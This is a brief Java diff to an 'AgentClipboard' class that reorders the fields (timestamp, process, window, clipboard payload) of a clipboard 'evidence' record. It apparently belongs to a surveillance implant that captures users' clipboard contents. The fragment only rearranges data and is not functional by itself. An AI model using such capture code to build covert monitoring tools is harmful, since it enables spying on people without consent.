@@ -55,10 +55,10 @@ public class AgentClipboard extends AgentBase {
 		byte[] window = WChar.getBytes("", true);
 		
 		final ArrayList<byte[]> items = new ArrayList<byte[]>();
-		items.add(tm);
-		items.add(payload);
+		items.add(tm);		
 		items.add(process);
 		items.add(window);
+		items.add(payload);
 		items.add(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));
 
 		LogR log = new LogR(EvidenceType.CLIPBOARD);
